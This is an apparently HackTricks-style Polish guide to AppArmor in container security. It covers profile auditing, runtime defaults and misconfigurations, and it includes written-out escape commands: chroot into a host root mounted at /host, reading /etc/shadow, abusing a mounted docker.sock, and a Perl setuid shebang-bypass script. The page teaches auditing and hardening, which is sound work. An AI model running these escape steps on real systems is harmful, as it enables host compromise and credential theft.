# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Przegląd

AppArmor to system **Obowiązkowej kontroli dostępu**, który stosuje ograniczenia za pomocą profili przypisanych do poszczególnych programów. W odróżnieniu od tradycyjnych kontroli DAC, które w dużej mierze zależą od własności użytkownika i grupy, AppArmor pozwala jądru egzekwować politykę związaną bezpośrednio z procesem. W środowiskach kontenerowych ma to znaczenie, ponieważ workload może mieć wystarczające tradycyjne uprawnienia, by spróbować wykonać akcję, a mimo to zostać zablokowany, ponieważ jego profil AppArmor nie zezwala na odpowiednią ścieżkę, mount, zachowanie sieciowe lub użycie capability.

Najważniejszym punktem koncepcyjnym jest to, że AppArmor jest **oparty na ścieżkach**. Ocenia dostęp do systemu plików za pomocą reguł dotyczących ścieżek, zamiast etykiet, jak robi to SELinux. To sprawia, że jest przystępny i potężny, ale również oznacza, że bind mounts i alternatywne układy ścieżek wymagają ostrożnej uwagi. Jeśli ta sama zawartość hosta stanie się dostępna pod inną ścieżką, skutki polityki mogą nie być takie, jak operator początkowo oczekiwał.

## Rola w izolacji kontenerów

Przeglądy bezpieczeństwa kontenerów często kończą się na sprawdzeniu capabilities i seccomp, ale AppArmor nadal ma znaczenie po tych kontrolach. Wyobraź sobie kontener, który ma więcej uprawnień niż powinien, lub workload, który potrzebował dodatkowego capability ze względów operacyjnych. AppArmor wciąż może ograniczać dostęp do plików, zachowanie mountów, sieć i wzorce wykonywania w sposób, który zablokuje oczywistą ścieżkę nadużycia. Dlatego wyłączenie AppArmor "tylko po to, aby aplikacja działała" może w ciszy przekształcić konfiguracyjne ryzyko w coś aktywnie wykorzystywalnego.

## Laboratorium

Aby sprawdzić, czy AppArmor jest aktywny na hoście, użyj:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Aby zobaczyć, pod jakim użytkownikiem uruchomiony jest bieżący proces kontenera:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Różnica jest pouczająca. W normalnym przypadku proces powinien pokazywać kontekst AppArmor powiązany z profilem wybranym przez runtime. W przypadku unconfined ta dodatkowa warstwa ograniczeń znika.

Możesz także sprawdzić, co Docker uważa, że zastosował:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Użycie w czasie wykonywania

Docker może zastosować domyślny lub niestandardowy profil AppArmor, gdy host to obsługuje. Podman może również integrować się z AppArmor na systemach opartych na AppArmor, chociaż na dystrybucjach faworyzujących SELinux to drugi system MAC często dominuje. Kubernetes może eksponować politykę AppArmor na poziomie workloadów na node'ach, które faktycznie obsługują AppArmor. LXC i powiązane środowiska system-container z rodziny Ubuntu również szeroko korzystają z AppArmor.

W praktyce AppArmor nie jest „funkcją Docker”. To cecha jądra/hosta, którą różne runtime'y mogą zdecydować się zastosować. Jeśli host tego nie obsługuje lub runtime zostanie uruchomiony jako unconfined, spodziewana ochrona tak naprawdę nie istnieje.

Dla Kubernetes konkretnie nowoczesnym API jest `securityContext.appArmorProfile`. Od Kubernetes `v1.30` starsze beta adnotacje AppArmor są przestarzałe. Na wspieranych hostach `RuntimeDefault` jest profilem domyślnym, podczas gdy `Localhost` wskazuje na profil, który musi być już załadowany na node. Ma to znaczenie podczas przeglądu, ponieważ manifest może wyglądać na świadomy AppArmor, a w rzeczywistości w pełni polegać na wsparciu po stronie node'a i wstępnie załadowanych profilach.

Jedną subtelną, ale użyteczną praktyczną wskazówką jest to, że explicite ustawienie `appArmorProfile.type: RuntimeDefault` jest bardziej restrykcyjne niż po prostu pominięcie pola. Jeśli pole jest ustawione explicite, a node nie obsługuje AppArmor, przyjęcie powinno zostać odrzucone. Jeśli pole zostanie pominięte, workload może nadal uruchomić się na nodzie bez AppArmor i po prostu nie otrzyma tej dodatkowej warstwy ograniczeń. Z punktu widzenia atakującego to dobry powód, by sprawdzać zarówno manifest, jak i rzeczywisty stan node'a.

Na hostach AppArmor obsługujących Docker najlepiej znanym profilem domyślnym jest `docker-default`. Ten profil jest generowany z AppArmor template Moby i jest ważny, ponieważ wyjaśnia, dlaczego niektóre PoC oparte na capability wciąż zawodzą w domyślnym kontenerze. Mówiąc ogólnie, `docker-default` pozwala na zwykłe operacje sieciowe, odmawia zapisu do dużej części `/proc`, odmawia dostępu do wrażliwych części `/sys`, blokuje operacje montowania i ogranicza ptrace, tak aby nie był to ogólny prymityw do sondowania hosta. Zrozumienie tej bazy pomaga odróżnić „kontener ma `CAP_SYS_ADMIN`” od „kontener faktycznie może użyć tej capability przeciwko interfejsom jądra, na których mi zależy”.

## Zarządzanie profilami

AppArmor profiles są zwykle przechowywane pod `/etc/apparmor.d/`. Powszechną konwencją nazewniczą jest zastąpienie slashy w ścieżce wykonywalnej kropkami. Na przykład profil dla `/usr/bin/man` zwykle jest przechowywany jako `/etc/apparmor.d/usr.bin.man`. Ten szczegół ma znaczenie zarówno podczas obrony, jak i oceny, ponieważ gdy znasz aktywną nazwę profilu, często możesz szybko zlokalizować odpowiadający plik na hoscie.

Przydatne polecenia zarządzania po stronie hosta obejmują:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Powód, dla którego te polecenia są istotne w kontekście bezpieczeństwa kontenerów, jest taki, że wyjaśniają, jak profile są faktycznie budowane, ładowane, przełączane do complain mode i modyfikowane po zmianach aplikacji. Jeśli operator ma zwyczaj przełączania profili do complain mode podczas rozwiązywania problemów i zapomina przywrócić enforcement, kontener może wyglądać na chroniony w dokumentacji, podczas gdy w rzeczywistości zachowuje się znacznie luźniej.

### Tworzenie i aktualizowanie profili

`aa-genprof` może obserwować zachowanie aplikacji i pomagać w interaktywnym generowaniu profilu:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` może wygenerować szablon profilu, który później można załadować za pomocą `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Kiedy plik binarny się zmienia i polityka wymaga aktualizacji, `aa-logprof` może odtworzyć odmowy znalezione w logach i pomóc operatorowi zdecydować, czy im zezwolić, czy je zablokować:
```bash
sudo aa-logprof
```
### Logi

Odmowy AppArmor są często widoczne w `auditd`, w syslogu lub za pomocą narzędzi takich jak `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Jest to przydatne operacyjnie i ofensywnie. Obrońcy wykorzystują to do dopracowywania profili. Atakujący wykorzystują to, by ustalić, która dokładnie ścieżka lub operacja jest blokowana i czy AppArmor jest mechanizmem blokującym łańcuch exploitów.

### Identyfikacja dokładnego pliku profilu

Gdy runtime pokazuje konkretną nazwę profilu AppArmor dla kontenera, często przydatne jest odnalezienie pliku profilu odpowiadającego tej nazwie na dysku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Jest to szczególnie przydatne podczas przeglądu po stronie hosta, ponieważ likwiduje lukę między "kontener twierdzi, że działa pod profilem `lowpriv`" a "rzeczywiste reguły znajdują się w tym konkretnym pliku, który można audytować lub przeładować".

### Najważniejsze reguły do audytu

Gdy możesz odczytać profil, nie ograniczaj się do prostych linii `deny`. Kilka typów reguł znacząco zmienia przydatność AppArmor przeciw próbie ucieczki z kontenera:

- `ux` / `Ux`: uruchamia docelowy plik binarny bez ograniczeń. Jeśli osiągalny helper, shell lub interpreter jest dozwolony w ramach `ux`, zwykle jest to pierwsze, co trzeba przetestować.
- `px` / `Px` i `cx` / `Cx`: wykonują przejścia profilu przy `exec`. Nie są automatycznie złe, ale warto je audytować, ponieważ przejście może wylądować w znacznie szerszym profilu niż obecny.
- `change_profile`: pozwala zadaniu przełączyć się na inny załadowany profil, natychmiast lub przy następnym `exec`. Jeśli docelowy profil jest słabszy, może to stać się zamierzoną furtką ucieczki z restrykcyjnej domeny.
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: to powinno wpłynąć na poziom zaufania, jakie pokładasz w profilu. `complain` loguje odmowy zamiast je egzekwować, `unconfined` usuwa granicę, a `prompt` zależy od ścieżki decyzyjnej w userspace zamiast czystego odrzucenia narzucanego przez jądro.
- `userns` or `userns create,`: nowsza polityka AppArmor może pośredniczyć w tworzeniu user namespaces. Jeśli profil kontenera wyraźnie to pozwala, zagnieżdżone user namespaces pozostają w grze nawet gdy platforma używa AppArmor jako części swojej strategii hardeningu.

Przydatne grep po stronie hosta:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Tego rodzaju audyt jest często bardziej przydatny niż wpatrywanie się w setki zwykłych reguł plikowych. Jeśli breakout zależy od wykonywania helpera, wejścia do nowego namespace lub ucieczki do mniej restrykcyjnego profile, odpowiedź często ukrywa się w tych regułach ukierunkowanych na przejścia, a nie w oczywistych liniach w stylu `deny /etc/shadow r`.

## Błędne konfiguracje

Najbardziej oczywistym błędem jest `apparmor=unconfined`. Administratorzy często ustawiają to podczas debugowania aplikacji, która zawiodła, ponieważ profil poprawnie zablokował coś niebezpiecznego lub nieoczekiwanego. Jeśli flaga pozostanie w produkcji, cała warstwa MAC zostaje faktycznie usunięta.

Innym subtelnym problemem jest zakładanie, że bind mounts są nieszkodliwe, ponieważ uprawnienia plików wyglądają normalnie. Ponieważ AppArmor jest path-based, ujawnianie ścieżek hosta pod alternatywnymi punktami montowania może źle współdziałać z regułami opartymi na ścieżkach. Trzecim błędem jest zapominanie, że nazwa profilu w pliku konfiguracyjnym niewiele znaczy, jeśli hostowy kernel faktycznie nie egzekwuje AppArmor.

## Wykorzystanie

Gdy AppArmor zostanie usunięty, operacje wcześniej ograniczone mogą nagle zacząć działać: odczytywanie wrażliwych ścieżek przez bind mounts, dostęp do części procfs lub sysfs, które powinny być trudniejsze w użyciu, wykonywanie operacji związanych z mount jeśli capabilities/seccomp również na to pozwalają, lub używanie ścieżek, które profil normalnie by odmówił. AppArmor często tłumaczy, dlaczego próba breakout oparta na capability "powinna zadziałać" na papierze, ale w praktyce nadal zawodzi. Usuń AppArmor, a ta sama próba może zacząć się udawać.

Jeśli podejrzewasz, że AppArmor jest główną rzeczą powstrzymującą path-traversal, bind-mount, lub mount-based łańcuch nadużyć, pierwszym krokiem zwykle jest porównanie tego, co staje się dostępne z profilem i bez niego. Na przykład, jeśli ścieżka hosta jest zamontowana wewnątrz kontenera, zacznij od sprawdzenia, czy możesz ją przejść i odczytać:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Jeśli kontener ma także niebezpieczne uprawnienie takie jak `CAP_SYS_ADMIN`, jednym z najbardziej praktycznych testów jest sprawdzenie, czy AppArmor jest mechanizmem blokującym operacje montowania lub dostęp do wrażliwych systemów plików jądra:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
W środowiskach, w których host path jest już dostępna przez bind mount, utrata AppArmor może również przemienić problem ujawniania informacji tylko do odczytu w bezpośredni dostęp do plików hosta:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Chodzi w tych poleceniach nie o to, że AppArmor sam tworzy breakout. Rzecz w tym, że po usunięciu AppArmor wiele ścieżek nadużyć opartych na systemie plików i mountach staje się od razu testowalnych.

### Pełny przykład: AppArmor wyłączony + root hosta zamontowany

Jeśli kontener ma już host root bind-mounted pod `/host`, usunięcie AppArmor może przekształcić zablokowaną ścieżkę nadużycia systemu plików w kompletne host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Gdy powłoka wykonuje się przez system plików hosta, workload skutecznie uciekł poza granice kontenera:
```bash
id
hostname
cat /etc/shadow | head
```
### Pełny przykład: AppArmor wyłączony + Runtime Socket

Jeśli prawdziwą barierą był AppArmor chroniący stan runtime, zamontowany socket może wystarczyć do pełnej ucieczki:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Dokładna ścieżka zależy od punktu montowania, ale końcowy rezultat jest ten sam: AppArmor przestaje zapobiegać dostępowi do runtime API, a runtime API może uruchomić kontener kompromitujący hosta.

### Pełny przykład: obejście bind-mount oparte na ścieżce

Ponieważ AppArmor działa na podstawie ścieżek, ochrona `/proc/**` nie chroni automatycznie tej samej zawartości procfs hosta, gdy jest ona dostępna przez inną ścieżkę:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
The impact depends on what exactly is mounted and whether the alternate path also bypasses other controls, but this pattern is one of the clearest reasons AppArmor must be evaluated together with mount layout rather than in isolation.

### Pełny przykład: Shebang Bypass

Polityka AppArmor czasami celuje w ścieżkę interpretera w sposób, który nie w pełni uwzględnia wykonywanie skryptów przez obsługę shebangu. Historyczny przykład polegał na użyciu skryptu, którego pierwsza linia wskazywała na ograniczony interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Taki przykład jest ważny jako przypomnienie, że intencja profilu i rzeczywista semantyka wykonywania mogą się rozbiegać. Podczas przeglądu AppArmor w środowiskach kontenerowych szczególną uwagę należy zwrócić na łańcuchy interpreterów i alternatywne ścieżki wykonywania.

## Sprawdzenia

Celem tych sprawdzeń jest szybkie odpowiedzenie na trzy pytania: czy AppArmor jest włączony na hoście, czy bieżący proces jest ograniczony oraz czy runtime faktycznie zastosował profil dla tego kontenera?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Co jest tutaj interesujące:

- Jeśli `/proc/self/attr/current` pokazuje `unconfined`, workload nie korzysta z confinement AppArmor.
- Jeśli `aa-status` pokazuje AppArmor disabled lub not loaded, każda nazwa profilu w runtime config jest głównie kosmetyczna.
- Jeśli `docker inspect` pokazuje `unconfined` lub niespodziewany custom profile, to często jest powód, dla którego ścieżka nadużycia oparta na filesystem lub mount działa.
- Jeśli `/sys/kernel/security/apparmor/profiles` nie zawiera profile, którego oczekiwałeś, konfiguracja runtime lub orchestratora sama w sobie nie wystarcza.
- Jeśli rzekomo hardened profile zawiera `ux`, broad `change_profile`, `userns`, lub `flags=(complain)` style rules, praktyczna granica może być znacznie słabsza niż sugeruje nazwa profilu.

Jeśli container już ma podniesione uprawnienia ze względów operacyjnych, pozostawienie AppArmor włączonego często robi różnicę między kontrolowanym wyjątkiem a znacznie szerszą awarią bezpieczeństwa.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

Dla AppArmor najważniejszą zmienną jest często **host**, nie tylko runtime. Ustawienie profilu w manifeście nie tworzy confinement na węźle, gdzie AppArmor nie jest włączony.

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
